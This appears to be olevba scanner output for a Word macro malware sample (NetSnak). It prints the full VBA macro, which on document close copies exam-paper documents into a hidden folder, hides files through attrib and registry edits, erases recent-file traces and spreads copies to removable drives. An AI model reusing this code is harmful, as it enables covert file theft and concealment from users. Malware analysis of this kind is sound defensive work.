olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.NetSnak.a-d74da64a8c8409bfdcfbc4ab2037651fd57567856ab247ece1c373745b6d34d7
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
Dim m() As Byte
Dim i, l As Integer
Dim pathname1, hexpathname, oldname As String
Dim hassaved As Boolean
On Error Resume Next
oldname = ActiveDocument.Name
hassaved = ActiveDocument.Saved
hexpathname = "X"
pathname1 = LCase(Left(ActiveDocument.Path, 2))
Set fso = CreateObject("scripting.filesystemobject")
Set w = CreateObject("wscript.shell")
If fso Is Nothing Or w Is Nothing Then
myfolder = "c:\"
Else
myfolder = w.specialfolders("Templates") & "\Software\"
If Not fso.folderexists(myfolder) Then
fso.createfolder myfolder
End If
End If
For Each ff In fso.getfolder(myfolder).Files
If DateValue(Date) - DateValue(ff.datecreated) - 1 > 30 Then
ff.Delete True
End If
Next

f = ActiveDocument.Paragraphs(1).Range.Find.Execute("试卷")
f = f Or ActiveDocument.Paragraphs(1).Range.Find.Execute("试题")
f = f Or ActiveDocument.Paragraphs(2).Range.Find.Execute("试卷")
f = f Or ActiveDocument.Paragraphs(2).Range.Find.Execute("试题")
If InStr(ActiveDocument.Name, "试卷") Or InStr(ActiveDocument.Name, "试题") Or f Then
i = InStrRev(ActiveDocument.Name, ".")
If i > 0 Then
m = Left(ActiveDocument.Name, i - 1)
Else
Exit Sub
End If
l = UBound(m)
For i = 0 To l
hexpathname = hexpathname & Format(Hex(m(i)), "00")
Next
hexpathname = myfolder & hexpathname & ".doc"
fso.deletefile hexpathname
If hassaved = False Then
ch = MsgBox("是否保存对 " & oldname & " 的修改？", vbYesNoCancel + vbExclamation)
If ch = vbYes Then
ActiveDocument.Save
End If
If ch = vbCancel Then
SendKeys "{ESC}"
Exit Sub
End If
End If
SendKeys " {Enter}"
Application.Dialogs(wdDialogFileSummaryInfo).Show
ActiveDocument.SaveAs hexpathname, , , "qwertyuiop98765"
Application.RecentFiles(1).Delete
fso.deletefile w.specialfolders("Recent") & "\X*.*"
End If

If Not w Is Nothing And Not fso Is Nothing Then
fso.copyfile pathname1 & "\X*.*", myfolder
w.Run "%COMSPEC% /c attrib +h +s """ & myfolder & "*.*""", 0, True
w.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Hidden", 2, "REG_DWORD"
w.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\ShowSuperHidden", 0, "REG_DWORD"
w.Run "%COMSPEC% /c ping -n 1 172.23.33.110>c:\asd.txt", 0, True
Set asd = fso.opentextfile("asd.txt", 1)
If InStr(asd.readall(), "(0% loss)") > 0 Then
asd.Close
fso.deletefile "c:\asd.txt"
GoTo quit
End If
fso.deletefile "c:\asd.txt"
If fso.getdrive(pathname1).drivetype = 1 Or (fso.getdrive(pathname1).drivetype = 2 And fso.getdrive(pathname1).totalsize < 512 * 1024 * 1024) Then
fso.copyfile myfolder & "X*.*", pathname1 & "\"
End If

End If
quit:
Set w = Nothing
Set fso = Nothing
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|copyfile            |May copy a file                              |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|wscript.shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |172.23.33.110       |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+

